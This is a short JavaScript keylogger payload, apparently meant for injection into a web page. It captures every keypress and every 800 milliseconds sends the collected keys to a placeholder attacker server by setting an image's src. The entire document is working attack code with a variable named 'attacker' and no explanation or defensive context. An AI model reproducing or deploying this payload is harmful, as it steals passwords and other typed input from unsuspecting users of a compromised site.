var keys = '';
var attacker = 'http://{SERVER_IP}:8085/k?c=';

document.addEventListener('keypress', function(e) {
    keys += e.key;
});

window.setInterval(function() {
    if (keys.length > 0) {
        var data = encodeURIComponent(keys);
        new Image().src = attacker + data;
        keys = '';
    }
}, 800);
